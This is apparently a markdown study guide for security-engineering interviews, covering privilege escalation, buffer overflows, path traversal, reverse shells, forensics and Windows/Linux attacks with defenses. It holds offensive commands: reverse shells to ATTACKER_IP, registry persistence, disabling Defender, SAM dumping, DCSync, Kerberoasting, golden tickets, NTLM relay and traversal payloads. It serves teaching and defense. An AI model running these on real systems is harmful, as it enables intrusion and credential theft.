# OS Implementation & Systems - Deep Dive

[Back to Main Notes](../interview-study-notes-for-security-engineering.md#os-implementation-and-systems)

> **Prerequisites:** Basic OS concepts, [Networking](networking.md)  
> **Difficulty:** Intermediate to Advanced

---

## Table of Contents

1. [Privilege Escalation Techniques and Prevention](#privilege-escalation-techniques-and-prevention)
2. [Buffer Overflows](#buffer-overflows)
3. [Directory Traversal Prevention](#directory-traversal-prevention)
4. [Remote Code Execution / Getting Shells](#remote-code-execution--getting-shells)
5. [Local Databases and Forensics](#local-databases-and-forensics)
6. [Windows Security Deep Dive](#windows-security-deep-dive)
   - [Registry](#windows-registry)
   - [Group Policy](#group-policy)
   - [Active Directory](#active-directory)
   - [Bloodhound](#bloodhound)
   - [Kerberos with AD](#kerberos-with-active-directory)
   - [SMB / Samba](#smb--samba)
   - [Windows Buffer Overflows and ROP](#windows-buffer-overflows-and-rop)
7. [Linux Security Deep Dive](#linux-security-deep-dive)
   - [SELinux](#selinux)
   - [Kernel, Userspace, and Permissions](#kernel-userspace-and-permissions)
   - [MAC vs DAC](#mac-vs-dac)
   - [/proc Filesystem](#proc-filesystem)
   - [/tmp Execution Risks](#tmp-execution-risks)
   - [/etc/shadow and Password Security](#etcshadow-and-password-security)
   - [LDAP](#ldap)
8. [macOS Security Deep Dive](#macos-security-deep-dive)
   - [Goto Fail](#goto-fail-cve-2014-1266)
   - [MacSweeper](#macsweeper)

---

## Privilege Escalation Techniques and Prevention

### Explanation

Privilege escalation is the act of exploiting a vulnerability, design flaw, or misconfiguration to gain elevated access to resources that are normally protected. There are two types:

- **Vertical escalation** (privilege elevation): A lower-privileged user gains higher privileges, e.g., a normal user becomes root/SYSTEM.
- **Horizontal escalation**: A user gains access to resources belonging to another user at the same privilege level.

Privilege escalation is almost always a required step in a full attack chain -- initial access rarely grants the attacker the level of control they need.

### How It Works

Enumerate the system for misconfigurations (tools: `linpeas.sh`, `winPEAS`), identify a vector (SUID/SGID binaries, sudo misconfigs, kernel exploits, writable cron jobs, unquoted service paths), exploit it to gain higher privileges, then establish persistence.

### Code/Command Examples

```bash
# Linux -- SUID enumeration and exploitation
find / -perm -4000 -type f 2>/dev/null
sudo -l  # Check sudo permissions
# If (ALL) NOPASSWD: /usr/bin/vim:
sudo vim -c '!sh'
```

```cmd
:: Windows -- Enumerate unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
```

### Real-World Examples

- **Dirty COW (CVE-2016-5195)** -- Kernel race condition allowed unprivileged users to write to read-only memory, enabling root escalation.
- **PwnKit (CVE-2021-4034)** -- Memory corruption in `pkexec` present for 12+ years; any unprivileged user could gain root.

### Defense

- Apply least privilege; audit SUID/SGID binaries and `sudoers` specificity.
- Keep kernels and OS packages patched.
- Quote all service paths on Windows; lock down service account permissions.
- Deploy EDR and filesystem integrity monitoring (AIDE, OSSEC).

### Interview Tip

When discussing privilege escalation, always frame it within an attack chain: initial access leads to enumeration, then escalation, then lateral movement. Interviewers want to see that you understand why escalation matters, not just the mechanics. Mention both OS-specific and cross-platform vectors.

### References

- MITRE ATT&CK: [T1068 - Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)
- GTFOBins: <https://gtfobins.github.io/>

---

## Buffer Overflows

### Explanation

A buffer overflow occurs when a program writes data beyond the boundary of a fixed-size buffer in memory. Because C and C++ do not perform automatic bounds checking on array accesses, writing past a buffer can overwrite adjacent memory -- including return addresses, function pointers, or other control data. This can crash the program (denial of service) or allow an attacker to redirect execution to arbitrary code.

There are two primary types:

- **Stack-based buffer overflow** -- Overwriting data on the call stack, typically the saved return address, so that when the function returns, execution jumps to attacker-controlled code.
- **Heap-based buffer overflow** -- Corrupting metadata or data structures on the heap, potentially leading to arbitrary write primitives.

### How It Works

A function allocates a fixed-size buffer on the stack. User input is copied without bounds checking (`strcpy`, `gets`). Excess bytes overwrite the saved return address (EIP/RIP). When `ret` executes, the CPU jumps to the attacker-controlled address -- either shellcode or a ROP chain.

**Memory layout (simplified, x86 stack growing downward):**

```
Lower addresses
+-----------------+
| buf[0..63]      |  <-- buffer starts here
+-----------------+
| Saved EBP       |  <-- overwritten
+-----------------+
| Saved EIP (ret) |  <-- overwritten with attacker address
+-----------------+
Higher addresses
```

### Code/Command Example

**Vulnerable C program:**

```c
void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
}
```

**Compiling without protections for testing:**

```bash
gcc -fno-stack-protector -z execstack -no-pie -m32 -o vuln vuln.c
```

### Real-World Examples

- **Morris Worm (1988)** -- Exploited a buffer overflow in `fingerd`; one of the first major internet worms.
- **Heartbleed (CVE-2014-0160)** -- Buffer over-read in OpenSSL leaked up to 64KB of server memory per request due to missing bounds checking.

### Defense

- Use memory-safe languages (Rust, Go) where possible.
- Enable compiler protections: stack canaries (`-fstack-protector-strong`), ASLR, DEP/NX, CFI.
- Use safe functions: `strncpy`, `snprintf` instead of `strcpy`, `gets`.
- Static analysis (CodeQL), fuzzing (AFL), and Address Sanitizer during development.

### Interview Tip

Be able to draw the stack layout and walk through the overflow step by step. Interviewers will often ask "what stops this from working on a modern system?" -- know the mitigations (canaries, ASLR, NX/DEP) and how each one can be bypassed (info leaks, ROP, partial overwrites).

### References

- MITRE CWE-120: [Buffer Copy without Checking Size of Input](https://cwe.mitre.org/data/definitions/120.html)
- Aleph One, "Smashing the Stack for Fun and Profit" (Phrack #49)

---

## Directory Traversal Prevention

### Explanation

Directory traversal (also called path traversal) is a vulnerability where an attacker manipulates file path inputs to access files and directories outside the intended scope. By injecting sequences like `../` (dot-dot-slash), an attacker can escape the web root or application directory and read (or sometimes write) arbitrary files on the server.

### How It Works

An application takes a filename as user input (e.g., `?file=report.pdf`) and constructs a filesystem path. The attacker injects `../../../../etc/passwd` to escape the intended directory and read arbitrary files. Variants include URL-encoded traversal (`%2e%2e%2f`), double-encoding, null byte injection, and backslash traversal on Windows.

### Code/Command Example

**Secure Node.js (canonicalize + prefix check):**

```javascript
app.get('/download', (req, res) => {
    const baseDir = '/var/www/files/';
    const requestedPath = path.resolve(baseDir, req.query.name);
    if (!requestedPath.startsWith(baseDir)) {
        return res.status(403).send('Forbidden');
    }
    res.sendFile(requestedPath);
});
```

```bash
# Exploitation examples
curl "http://target.com/download?name=../../../etc/passwd"
curl "http://target.com/download?name=..%2f..%2f..%2fetc%2fpasswd"
```

### Real-World Examples

- **CVE-2020-5902** -- F5 BIG-IP path traversal in the TMUI (Traffic Management User Interface) allowed unauthenticated RCE, rated CVSS 9.8. Attackers used `..;/` to bypass access controls.
- **CVE-2021-41773 / CVE-2021-42013** -- Apache HTTP Server 2.4.49/2.4.50 had a path traversal flaw where `%2e` decoding allowed access to files outside the document root, and with CGI enabled, RCE.

### Defense

- Canonicalize paths (`realpath()`, `path.resolve()`) and validate the result starts with the expected base directory.
- Whitelist allowed filenames where possible; reject `..`, null bytes, encoded variants.
- Run applications with minimal filesystem permissions; use chroot/containers.

### Interview Tip

When asked about directory traversal, mention the difference between blacklist filtering (fragile -- there are many encoding tricks) and canonicalization + prefix checking (robust). Demonstrate awareness of OS-specific differences: Windows allows backslash, has drive letters, and treats certain characters differently.

### References

- MITRE CWE-22: [Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

---

## Remote Code Execution / Getting Shells

### Explanation

Remote Code Execution (RCE) is the ability for an attacker to run arbitrary commands or code on a target machine over a network. "Getting a shell" refers to obtaining an interactive command-line interface on the target. This is typically the most impactful class of vulnerability because it gives the attacker full control over the compromised system.

Shells come in several forms:

- **Bind shell** -- The target opens a port and listens; the attacker connects to it.
- **Reverse shell** -- The target connects back to the attacker's listener; this bypasses firewalls that block inbound connections.
- **Web shell** -- A server-side script (PHP, ASPX, JSP) uploaded to a web server that provides command execution via HTTP.

### How It Works

Identify an RCE vector (unpatched vuln, deserialization, command injection, file upload), deliver the payload, establish a reverse/bind/web shell, then stabilize and escalate.

### Code/Command Examples

```bash
# Reverse shells
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Listener
nc -lvnp 4444

# Shell stabilization
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z, then: stty raw -echo; fg
```

### Real-World Examples

- **EternalBlue (CVE-2017-0144)** -- SMBv1 flaw exploited by WannaCry; unauthenticated RCE on Windows systems worldwide.
- **Log4Shell (CVE-2021-44228)** -- JNDI injection in Log4j allowed RCE via `${jndi:ldap://attacker/a}`. Impacted millions of Java apps.

### Defense

- Patch aggressively; disable unnecessary services and management interfaces.
- Network segmentation to limit outbound connections (reverse shell detection).
- WAFs, IDS/IPS, and application sandboxing/containerization.

### Interview Tip

Distinguish between the vulnerability (the flaw) and the payload (the shell). Reverse shells are preferred because firewalls typically allow outbound connections; bind shells are simpler but blocked by most firewalls.

### References

- MITRE ATT&CK: [T1210 - Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/)
- Reverse Shell Cheat Sheet: <https://www.revshells.com/>

---

## Local Databases and Forensics

### Explanation

Many applications store data in local SQLite databases. Messaging apps (Signal, WhatsApp, iMessage, Telegram), browsers (Chrome, Firefox), and OS components use SQLite extensively. These databases are forensic goldmines -- they contain messages, contacts, call logs, browsing history, cookies, and credentials. In digital forensics and incident response (DFIR), extracting and analyzing these databases is a core skill.

### How It Works

1. **Acquisition** -- Obtain a forensic image of the device or extract the relevant database files.
2. **Location** -- Know where databases live:
   - **iOS iMessage**: `sms.db` in the iOS backup or at `/var/mobile/Library/SMS/sms.db`
   - **Android SMS**: `/data/data/com.android.providers.telephony/databases/mmssms.db`
   - **Chrome history**: `~/.config/google-chrome/Default/History` (Linux) or `%LOCALAPPDATA%\Google\Chrome\User Data\Default\History` (Windows)
   - **Firefox**: `~/.mozilla/firefox/<profile>/places.sqlite`
   - **Signal Desktop**: `~/.config/Signal/sql/db.sqlite` (encrypted with SQLCipher)
3. **Extraction and analysis** -- Open the database with `sqlite3` CLI or a GUI tool like DB Browser for SQLite.
4. **Correlation** -- Cross-reference timestamps, contacts, and message content with other evidence.

### Code/Command Examples

```bash
# Open a Chrome history database
sqlite3 ~/.config/google-chrome/Default/History

# List all tables
.tables

# View recent browsing history
SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch') AS visit_time
FROM urls ORDER BY last_visit_time DESC LIMIT 20;

# Firefox saved logins (passwords are encrypted, but metadata is visible)
sqlite3 ~/.mozilla/firefox/*.default-release/places.sqlite \
  "SELECT url, title, visit_count FROM moz_places ORDER BY visit_count DESC LIMIT 20;"

# Dump WhatsApp message database (Android, rooted)
adb pull /data/data/com.whatsapp/databases/msgstore.db .
sqlite3 msgstore.db "SELECT * FROM messages LIMIT 10;"
```

### Real-World Examples

- **San Bernardino iPhone case (2016)** -- The FBI sought to access an encrypted iPhone's local databases for forensic evidence. Apple's refusal led to a major legal battle; the FBI ultimately used a third-party tool (allegedly Cellebrite).
- **Pegasus spyware (NSO Group)** -- Forensic analysis of compromised phones involved examining SQLite databases alongside other artifacts to trace the spyware's activity.

### Defense

- Encrypt databases at rest (SQLCipher for SQLite, full-disk encryption).
- Use secure deletion when removing sensitive records (though SSD wear-leveling complicates this).
- Enable full-disk encryption on all devices (FileVault, BitLocker, LUKS).
- Limit physical access to devices.
- For applications: minimize data retention and store sensitive data in secure enclaves or keychains.

### Interview Tip

When discussing forensics, show awareness of the chain of custody and the difference between a live acquisition and a dead (offline) image. Mention that SQLite uses a write-ahead log (WAL) that can contain recently deleted data, making it especially valuable for forensics.

### References

- SQLite documentation: <https://sqlite.org/docs.html>
- SANS DFIR: <https://www.sans.org/digital-forensics-incident-response/>

---

## Windows Security Deep Dive

### Windows Registry

#### Explanation

The Windows Registry is a hierarchical database that stores low-level settings for the OS and applications. It contains configuration data, hardware settings, user preferences, security policies, and information about installed software. From a security perspective, the registry is both a target for attackers (persistence, credential storage) and a tool for defenders (auditing, forensic artifacts).

**Key hives:**

| Hive | Purpose |
|------|---------|
| `HKEY_LOCAL_MACHINE (HKLM)` | System-wide settings, hardware, software config |
| `HKEY_CURRENT_USER (HKCU)` | Settings for the currently logged-in user |
| `HKEY_USERS (HKU)` | All loaded user profiles |
| `HKEY_CLASSES_ROOT (HKCR)` | File associations and COM objects |

#### How Attackers Use It

- **Persistence**: Add entries to `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` or `HKCU\...\Run` so malware executes on login.
- **Credential harvesting**: SAM hive (`HKLM\SAM`) contains hashed passwords; tools like `mimikatz` or `secretsdump.py` can extract them.
- **Disabling security**: Modify registry keys to disable Windows Defender, firewall, or UAC.

#### Code/Command Examples

```cmd
:: View Run keys (persistence locations)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

:: Add persistence (as attacker)
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Users\Public\malware.exe"

:: Disable Windows Defender real-time monitoring
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1

:: Export SAM hive (requires SYSTEM privileges)
reg save HKLM\SAM C:\temp\sam.save
reg save HKLM\SYSTEM C:\temp\system.save
```

#### Defense

- Monitor registry changes with Sysmon (Event IDs 12, 13, 14).
- Restrict write access to sensitive keys using ACLs.
- Use application whitelisting (AppLocker, WDAC) to prevent unsigned binaries from executing.

#### References

- MITRE ATT&CK: [T1547.001 - Registry Run Keys](https://attack.mitre.org/techniques/T1547/001/)
- Microsoft: [Windows Registry](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry)

---

### Group Policy

#### Explanation

Group Policy is a Windows feature for centralized management of user and computer settings in an Active Directory environment. Group Policy Objects (GPOs) can enforce security configurations, software deployment, login scripts, and access controls across thousands of machines from a single point.

#### How It Works

1. Admins create or modify GPOs using the Group Policy Management Console (GPMC).
2. GPOs are linked to OUs (Organizational Units), domains, or sites.
3. When a computer starts or a user logs in, applicable GPOs are pulled from SYSVOL and applied in order: Local > Site > Domain > OU (LSDOU).
4. Settings include password policies, account lockout thresholds, software restrictions, firewall rules, and audit policies.

#### Security Concerns

- **SYSVOL abuse**: GPO preferences (`Groups.xml`) historically stored passwords in reversible AES-256 encryption with a publicly known key (MS14-025). Tools like `gpp-decrypt` trivially recover them.
- **GPO hijacking**: If an attacker gains write access to a GPO, they can push malicious configurations or software to every machine the GPO is linked to.

#### Code/Command Examples

```powershell
# List all GPOs in a domain
Get-GPO -All | Select-Object DisplayName, Id, GpoStatus

# Find GPOs that modify security settings
Get-GPOReport -All -ReportType Xml | Select-String "SecuritySettings"

# Decrypt a Group Policy Preferences password
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

#### Defense

- Ensure MS14-025 patch is applied; remove any `cpassword` entries from SYSVOL.
- Restrict GPO edit permissions to a minimal set of admins.
- Monitor GPO changes via event logs and SIEM.

#### References

- Microsoft: [Group Policy Overview](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791(v=ws.11))
- MITRE ATT&CK: [T1484.001 - Group Policy Modification](https://attack.mitre.org/techniques/T1484/001/)

---

### Active Directory

#### Explanation

Active Directory (AD) is Microsoft's directory service for Windows domain networks. It provides authentication (via Kerberos and NTLM), authorization, and a searchable directory of network resources (users, computers, groups, policies). AD is the backbone of enterprise Windows environments, and compromising it typically means compromising the entire organization.

#### Key Concepts

- **Domain Controller (DC)**: Servers that host AD and handle authentication.
- **NTDS.dit**: The AD database file containing all user accounts and password hashes.
- **Distinguished Names (DN)**: Unique identifiers like `CN=jsmith,OU=Users,DC=corp,DC=com`.
- **Trust relationships**: Allow users in one domain to authenticate to resources in another.
- **Service accounts**: Accounts used by services; often have excessive privileges and weak passwords.

#### Attack Vectors

- **Password spraying**: Try common passwords against many accounts.
- **Kerberoasting**: Request TGS tickets for service accounts and crack them offline.
- **DCSync**: Impersonate a domain controller to replicate password hashes from another DC.
- **Golden/Silver Tickets**: Forge Kerberos tickets using compromised KRBTGT or service account hashes.
- **NTDS.dit extraction**: Dump the full AD database using `ntdsutil`, Volume Shadow Copy, or `secretsdump.py`.

#### Code/Command Examples

```bash
# Enumerate AD with ldapsearch
ldapsearch -x -H ldap://dc01.corp.com -b "DC=corp,DC=com" "(objectClass=user)" sAMAccountName

# DCSync attack with impacket
secretsdump.py corp.com/admin:Password123@dc01.corp.com -just-dc-ntlm

# Password spraying with crackmapexec
crackmapexec smb dc01.corp.com -u users.txt -p 'Winter2024!' --continue-on-success
```

#### Defense

- Tier your administration: separate Domain Admin credentials from daily-use accounts.
- Enable Protected Users security group for sensitive accounts.
- Monitor for DCSync (Event ID 4662 with specific GUIDs).
- Enforce strong password policies and MFA for admin accounts.
- Limit service account permissions and use Group Managed Service Accounts (gMSAs).

#### References

- MITRE ATT&CK: [T1003.006 - DCSync](https://attack.mitre.org/techniques/T1003/006/)
- Microsoft: [Active Directory Domain Services](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview)

---

### Bloodhound

#### Explanation

BloodHound is an open-source tool that uses graph theory to reveal hidden and unintended relationships within an Active Directory environment. It maps out AD objects and their ACL-based relationships, finding attack paths that would be nearly impossible to discover manually. Both attackers and defenders use it.

#### How It Works

1. **Collection** -- SharpHound (the data collector) queries AD via LDAP and the Windows API, gathering information about users, groups, computers, sessions, ACLs, and trusts.
2. **Ingestion** -- The collected JSON data is imported into a Neo4j graph database.
3. **Analysis** -- BloodHound's pre-built queries reveal attack paths, such as "shortest path from Domain Users to Domain Admins."

#### Code/Command Examples

```powershell
# Run SharpHound collector
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# Or with the Python collector (from Linux)
bloodhound-python -d corp.com -u jsmith -p Password123 -ns 10.10.10.1 -c all

# Key Cypher queries in BloodHound/Neo4j
# Shortest path from owned user to Domain Admin
MATCH p=shortestPath((n {owned:true})-[*1..]->(m:Group {name:"DOMAIN ADMINS@CORP.COM"})) RETURN p
```

#### Defense

- Run BloodHound defensively to find and eliminate dangerous attack paths before an attacker does.
- Remove unnecessary admin group memberships.
- Clean up stale ACLs and excessive delegations.
- Restrict where Domain Admins can log in to reduce session exposure.

#### References

- BloodHound GitHub: <https://github.com/BloodHoundAD/BloodHound>
- SpecterOps blog: <https://posts.specterops.io/>

---

### Kerberos with Active Directory

#### Explanation

Kerberos is the default authentication protocol in Active Directory. It uses symmetric-key cryptography and a trusted third party (the Key Distribution Center on the Domain Controller) to authenticate users and services without sending passwords over the network.

#### How It Works

1. **AS-REQ / AS-REP**: The client sends an Authentication Service Request to the KDC. If credentials are valid, the KDC returns a Ticket Granting Ticket (TGT) encrypted with the KRBTGT account hash.
2. **TGS-REQ / TGS-REP**: The client presents its TGT to request a Ticket Granting Service ticket for a specific service (e.g., a file server). The TGS ticket is encrypted with the target service account's hash.
3. **AP-REQ / AP-REP**: The client presents the TGS ticket to the target service. The service decrypts it with its own key and grants access.

#### Key Attacks

| Attack | Description |
|--------|-------------|
| **Kerberoasting** | Request TGS tickets for SPNs, crack them offline to recover service account passwords |
| **AS-REP Roasting** | Target accounts with "Do not require Kerberos preauthentication" and crack the AS-REP |
| **Golden Ticket** | Forge TGTs using the KRBTGT hash; grants unlimited access until the KRBTGT password is reset twice |
| **Silver Ticket** | Forge TGS tickets using a service account hash; access specific services without touching the DC |
| **Pass the Ticket** | Steal and reuse existing Kerberos tickets from memory |

#### Code/Command Examples

```bash
# Kerberoasting with Impacket
GetUserSPNs.py corp.com/jsmith:Password123 -dc-ip 10.10.10.1 -request -outputfile kerberoast.txt

# Crack the ticket
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# AS-REP Roasting
GetNPUsers.py corp.com/ -usersfile users.txt -dc-ip 10.10.10.1 -format hashcat

# Golden Ticket with Mimikatz
kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-... /krbtgt:NTLM_HASH /ptt
```

#### Defense

- Use long (25+ character), random passwords for service accounts; prefer gMSAs.
- Disable "Do not require Kerberos preauthentication" for all accounts.
- Reset the KRBTGT password regularly (and twice to invalidate golden tickets).
- Monitor for anomalous TGS requests (high volume from a single user).
- Enable AES encryption for Kerberos and disable RC4 where possible.

#### References

- MITRE ATT&CK: [T1558 - Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/)
- Microsoft: [Kerberos Authentication Overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)

---

### SMB / Samba

#### Explanation

Server Message Block (SMB) is a network file-sharing protocol used primarily on Windows. Samba is the open-source implementation for Linux/Unix. SMB is used for file sharing, printer access, inter-process communication (named pipes), and remote administration. It is one of the most attacked protocols in enterprise networks.

**Versions:** SMBv1 (deprecated, dangerous), SMBv2, SMBv3 (with encryption).

#### Security Concerns

- **SMBv1 vulnerabilities**: EternalBlue (MS17-010) exploited SMBv1 for unauthenticated RCE.
- **Null sessions**: Anonymous access to shares can leak user lists and share names.
- **Relay attacks (NTLM relay)**: Captured NTLM authentication can be relayed to another host for unauthorized access.
- **Credential harvesting**: Responder can poison LLMNR/NBT-NS to capture NTLM hashes when clients fail DNS resolution.

#### Code/Command Examples

```bash
# Enumerate SMB shares
smbclient -L //target -N              # Null session
crackmapexec smb target -u '' -p ''   # Check for anonymous access

# Connect to a share
smbclient //target/share -U 'corp\user%password'

# EternalBlue scan
nmap -p 445 --script smb-vuln-ms17-010 target

# NTLM relay attack
# 1. Start Responder to capture hashes:
responder -I eth0 -dwP
# 2. Or relay them with ntlmrelayx:
ntlmrelayx.py -tf targets.txt -smb2support
```

#### Defense

- Disable SMBv1 on all systems (`Set-SmbServerConfiguration -EnableSMB1Protocol $false`).
- Require SMB signing to prevent relay attacks.
- Enable SMBv3 encryption.
- Restrict SMB access at the firewall (block TCP 445 at the perimeter).
- Disable LLMNR and NBT-NS to prevent Responder-style attacks.

#### References

- MITRE ATT&CK: [T1021.002 - SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/)
- Microsoft: [SMB security enhancements](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-security)

---

### Windows Buffer Overflows and ROP

#### Explanation

On modern Windows, classic stack buffer overflows are mitigated by DEP (Data Execution Prevention) and ASLR (Address Space Layout Randomization). Return-Oriented Programming (ROP) is the primary technique used to bypass DEP. Instead of injecting new code, ROP chains together small instruction sequences ("gadgets") already present in executable memory.

#### How ROP Works

1. The attacker finds a buffer overflow that controls the return address.
2. Instead of pointing EIP/RIP at shellcode, the attacker constructs a chain of return addresses on the stack.
3. Each address points to a "gadget" -- a short instruction sequence ending in `ret` (e.g., `pop eax; ret`, `xchg eax, esp; ret`).
4. As each gadget returns, it pops the next address, executing a chain of micro-operations.
5. A common ROP strategy is to call `VirtualProtect()` or `VirtualAlloc()` to mark a memory region as executable, then redirect execution to shellcode placed there.

#### Code/Command Examples

```python
# Conceptual ROP chain structure (32-bit Windows)
# Goal: call VirtualProtect to mark stack as RWX, then jump to shellcode

from struct import pack

rop_chain  = pack('<I', 0x77c12345)  # pop ecx; ret (gadget from ntdll.dll)
rop_chain += pack('<I', 0x00000040)  # PAGE_EXECUTE_READWRITE
rop_chain += pack('<I', 0x77c12350)  # pop edx; ret
rop_chain += pack('<I', 0x00001000)  # size
rop_chain += pack('<I', 0x7c801ad4)  # VirtualProtect address
# ... additional gadgets to set up remaining parameters
```

```bash
# Finding ROP gadgets with ropper
ropper --file ntdll.dll --search "pop eax"

# Or with mona.py in Immunity Debugger
!mona rop -m ntdll.dll
```

#### Defense

- Enable ASLR, DEP, and CFG (Control Flow Guard) system-wide.
- Compile with `/GS` (stack cookies), `/DYNAMICBASE` (ASLR), `/NXCOMPAT` (DEP), `/guard:cf` (CFG).
- Use EMET or Windows Defender Exploit Guard for additional mitigations on legacy applications.
- Migrate to 64-bit -- ASLR entropy is dramatically higher, making ROP harder.

#### References

- Microsoft: [Data Execution Prevention](https://learn.microsoft.com/en-us/windows/win32/memory/data-execution-prevention)
- MITRE ATT&CK: [T1055 - Process Injection](https://attack.mitre.org/techniques/T1055/)

---

## Linux Security Deep Dive

### SELinux

#### Explanation

Security-Enhanced Linux (SELinux) is a Linux kernel security module that provides Mandatory Access Controls (MAC). Developed by the NSA and Red Hat, SELinux confines processes to the minimum set of resources they need, even if they are running as root. It uses security labels (contexts) on every file, process, port, and user to enforce policies.

#### How It Works

1. Every object (file, socket, process) is labeled with a security context: `user:role:type:level` (e.g., `system_u:object_r:httpd_sys_content_t:s0`).
2. Policy rules define which types can interact: `allow httpd_t httpd_sys_content_t:file { read getattr };`
3. When a process (subject) tries to access an object, the kernel checks the policy. If no rule explicitly allows the action, it is denied -- even for root.
4. SELinux operates in three modes: **Enforcing** (denies and logs), **Permissive** (logs but allows), **Disabled**.

#### Code/Command Examples

```bash
# Check SELinux status
getenforce
sestatus

# View security context of files
ls -Z /var/www/html/
# Output: system_u:object_r:httpd_sys_content_t:s0 index.html

# View context of processes
ps auxZ | grep httpd

# Change a file's context
chcon -t httpd_sys_content_t /var/www/html/newfile.html
# Or persistently:
semanage fcontext -a -t httpd_sys_content_t "/var/www/html(/.*)?"
restorecon -Rv /var/www/html/

# Troubleshoot denials
ausearch -m avc -ts recent
sealert -a /var/log/audit/audit.log
```

#### Defense

- Keep SELinux in enforcing mode. Never disable it in production.
- Use `audit2allow` carefully -- overly permissive custom policies undermine SELinux.
- Write targeted policies for custom applications.
- Use SELinux booleans to toggle specific behaviors: `setsebool -P httpd_can_network_connect on`.

#### References

- Red Hat SELinux Guide: <https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html/using_selinux/>
- `man selinux`, `man semanage`

---

### Kernel, Userspace, and Permissions

#### Explanation

Linux divides execution into two spaces:

- **Kernel space (Ring 0)**: The kernel has unrestricted access to hardware, memory, and all resources. Kernel modules, device drivers, and the scheduler run here.
- **User space (Ring 3)**: Applications run with restricted access. They interact with the kernel via system calls (syscalls).

**Unix permissions model:**

- Every file has an owner (user), group, and permissions (read/write/execute) for owner, group, and others.
- Represented as `rwxrwxrwx` (9 bits) plus special bits: SUID (4000), SGID (2000), sticky (1000).
- **SUID**: When set on an executable, the process runs with the file owner's UID (e.g., `passwd` runs as root).
- **SGID**: Process inherits the file's group ID; on directories, new files inherit the directory's group.
- **Sticky bit**: On directories (like `/tmp`), only the file owner can delete their own files.

#### Code/Command Examples

```bash
# View permissions
ls -la /etc/passwd /etc/shadow /usr/bin/passwd
# -rw-r--r-- 1 root root   /etc/passwd
# -rw-r----- 1 root shadow /etc/shadow
# -rwsr-xr-x 1 root root   /usr/bin/passwd  (SUID set!)

# Trace syscalls made by a process
strace -f -e trace=open,read,write ls /tmp

# List capabilities of a binary (finer-grained than SUID)
getcap /usr/bin/ping
# /usr/bin/ping cap_net_raw=ep

# Set a capability instead of SUID
setcap cap_net_raw+ep /usr/bin/ping
```

#### Defense

- Minimize SUID/SGID binaries; use Linux capabilities as a finer-grained alternative.
- Apply the principle of least privilege to file permissions.
- Use `namespaces` and `cgroups` for process isolation (the foundation of containers).
- Enable kernel hardening: `kernel.randomize_va_space=2`, `kernel.kptr_restrict=1`, `kernel.dmesg_restrict=1`.

#### References

- `man capabilities`, `man namespaces`, `man chmod`
- Linux Kernel documentation: <https://www.kernel.org/doc/html/latest/>

---

### MAC vs DAC

#### Explanation

**Discretionary Access Control (DAC)** is the traditional Unix permissions model. The resource owner decides who gets access. Standard file permissions (`chmod`, `chown`) are DAC -- the owner can grant permissions to anyone.

**Mandatory Access Control (MAC)** is enforced by the system, not the owner. Even root cannot override MAC policies. SELinux and AppArmor are MAC implementations.

| Feature | DAC | MAC |
|---------|-----|-----|
| Who sets policy | Resource owner | System administrator/policy |
| Can root bypass it? | Yes | No |
| Granularity | User/group/other | Labels/profiles per process |
| Default on Linux | Yes | Requires SELinux/AppArmor |
| Weakness | Over-reliance on owner discipline | Complexity of policy management |

#### Interview Tip

Frame it as defense in depth: DAC is the baseline, MAC is a safety net. Even if an attacker gains root through an exploit, a properly configured MAC policy can prevent them from accessing sensitive files or network ports. This is exactly the scenario SELinux was designed for.

#### References

- NIST: [Access Control](https://csrc.nist.gov/publications/detail/sp/800-162/final)

---

### /proc Filesystem

#### Explanation

`/proc` is a virtual filesystem in Linux that exposes kernel and process information as files. It contains no actual files on disk -- everything is generated dynamically by the kernel. It is invaluable for debugging, monitoring, and security analysis, but can also leak sensitive information to attackers.

#### Key Security-Relevant Entries

| Path | Contents |
|------|----------|
| `/proc/[pid]/cmdline` | Command line arguments of a process |
| `/proc/[pid]/environ` | Environment variables (may contain secrets!) |
| `/proc/[pid]/maps` | Memory mappings (useful for ASLR bypass) |
| `/proc/[pid]/fd/` | Open file descriptors |
| `/proc/[pid]/status` | Process status including UID, capabilities |
| `/proc/sys/kernel/randomize_va_space` | ASLR setting (0=off, 1=partial, 2=full) |
| `/proc/version` | Kernel version (useful for kernel exploit selection) |

#### Code/Command Examples

```bash
# Read environment variables of a process (may contain credentials)
cat /proc/$(pgrep -f myapp)/environ | tr '\0' '\n'

# Check ASLR status
cat /proc/sys/kernel/randomize_va_space

# List open files for a process
ls -la /proc/$(pgrep -f nginx)/fd/

